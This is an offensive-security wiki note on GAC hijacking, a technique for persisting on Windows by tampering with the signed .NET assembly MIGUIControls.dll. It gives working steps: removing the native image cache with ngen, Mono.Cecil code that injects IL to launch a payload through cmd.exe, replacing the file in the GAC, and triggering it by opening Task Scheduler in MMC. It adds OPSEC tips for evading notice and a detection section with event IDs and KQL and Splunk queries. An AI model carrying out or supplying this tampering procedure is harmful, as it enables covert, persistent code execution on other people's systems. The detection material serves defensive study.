---
title: GAC Hijacking (.NET Assembly Tampering)
permalink: /wiki/offsec-notes/concepts/gac-hijacking/
layout: single
author_profile: true
tags:
- offsec-notes
- concept
---

**Category:** Persistence / Defense Evasion / Execution
**MITRE ATT&CK:** T1574.001 — DLL Side-Loading; T1546 — Event Triggered Execution
**Related:** [Dll Hijacking](/wiki/offsec-notes/concepts/dll-hijacking/), [Evasion Techniques](/wiki/offsec-notes/concepts/evasion-techniques/), Persistence

## Overview
The .NET Global Assembly Cache (GAC) stores shared assemblies that applications load by name. `MIGUIControls.dll`, a signed Microsoft assembly in GAC_MSIL, is loaded by `mmc.exe` when opening the Task Scheduler snap-in. Using **Mono.Cecil**, an attacker can inject IL code into the DLL without resigning it — bypassing the signature check that would otherwise occur — and establish persistent code execution triggered whenever a user opens Task Scheduler in MMC.

## GAC Architecture

The GAC lives at:
```
C:\Windows\Microsoft.NET\assembly\GAC_MSIL\<AssemblyName>\<Version>\<Assembly>.dll
```

Target assembly:
```
C:\Windows\Microsoft.NET\assembly\GAC_MSIL\MIGUIControls\v4.0_....\MIGUIControls.dll
```

`mmc.exe` (Microsoft Management Console) loads `MIGUIControls.dll` automatically when the Task Scheduler snap-in is opened.

## Attack Procedure

### Step 1: Remove Native Image Cache
The CLR maintains a native image (pre-JIT compiled) cache. If a native image exists, the original DLL isn't loaded from disk — it must be removed to force the CLR to load the modified DLL.

```cmd
ngen.exe uninstall MIGUIControls
```

This triggers `mscorsvw.exe` to recompile (background process). Wait for it to complete or kill it.

### Step 2: Modify Assembly with Mono.Cecil
Mono.Cecil allows IL injection without signing — it bypasses assembly signing checks that normally prevent modification of signed assemblies.

```csharp
using Mono.Cecil;
using Mono.Cecil.Cil;

var assembly = AssemblyDefinition.ReadAssembly("MIGUIControls.dll");
var targetMethod = assembly.MainModule.GetType("MIGUIControls.SomeClass")
                            .Methods.First(m => m.Name == ".cctor");

var processor = targetMethod.Body.GetILProcessor();
var first = targetMethod.Body.Instructions.First();

// Inject: System.Diagnostics.Process.Start("cmd.exe", "/c payload.exe")
var startMethod = assembly.MainModule.ImportReference(
    typeof(System.Diagnostics.Process).GetMethod("Start", 
        new[] { typeof(string), typeof(string) }));

processor.InsertBefore(first, processor.Create(OpCodes.Ldstr, "cmd.exe"));
processor.InsertBefore(first, processor.Create(OpCodes.Ldstr, "/c C:\\temp\\payload.exe"));
processor.InsertBefore(first, processor.Create(OpCodes.Call, startMethod));
processor.InsertBefore(first, processor.Create(OpCodes.Pop));

assembly.Write("MIGUIControls.dll");  // Overwrite in-place
```

### Step 3: Replace Assembly in GAC
```cmd
copy MIGUIControls.dll "C:\Windows\Microsoft.NET\assembly\GAC_MSIL\MIGUIControls\..."
```

### Step 4: Trigger
User opens MMC → opens Task Scheduler snap-in → `MIGUIControls.dll` loads → payload executes under `mmc.exe` context.

**Requirements:** Administrator (write to GAC path requires elevated access)

## OPSEC Notes
- `mmc.exe` is a legitimate signed Microsoft binary — network connections from it blend in less than from `cmd.exe`
- IL modification via Mono.Cecil produces no signature warning at runtime because the CLR's strong-name check can be disabled or bypassed for MSIL assemblies
- The `ngen.exe uninstall` step is a behavioral IOC

## Detection

### Key Events

| Event ID | Source | Description |
|----------|--------|-------------|
| 4688 | Security | Process creation — `ngen.exe uninstall` or modified `mscorsvw.exe` |
| 4663 | Security | File access — writing to GAC path |
| 4660 | Security | File deletion — native image cache removal |

### Sysmon
- **Event ID 1** — Process Create: `ngen.exe` with arguments containing `uninstall`
- **Event ID 11** — File Create: new DLL written to `GAC_MSIL\MIGUIControls\` path

### KQL (MDE)
```kql
DeviceFileEvents
| where FolderPath contains "GAC_MSIL\\MIGUIControls"
| where ActionType in ("FileCreated", "FileModified")
| project Timestamp, DeviceName, InitiatingProcessFileName, FolderPath, FileName
```

### Splunk
```spl
index=wineventlog EventCode=4688 CommandLine="*ngen*uninstall*MIGUIControls*"
```

## References
- ipurple.team — "GAC Hijacking" (2026-02-10)
- Mono.Cecil — github.com/jbevain/cecil
